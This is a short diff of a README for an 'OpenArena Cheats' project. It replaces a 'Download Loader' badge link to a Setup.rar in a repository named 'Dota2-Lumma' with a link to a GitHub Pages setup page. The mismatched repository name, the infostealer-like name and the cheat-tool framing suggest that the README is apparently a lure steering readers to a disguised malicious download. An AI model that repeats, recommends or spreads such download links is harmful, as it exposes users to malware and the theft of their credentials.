@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for OpenArena Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `OpenArena-Cheats` · Updated: 2026-10-31
 
 **Tags:** `openarena` `fps` `arena-shooter` `quake-3` `open-source` `github`
+
 
 
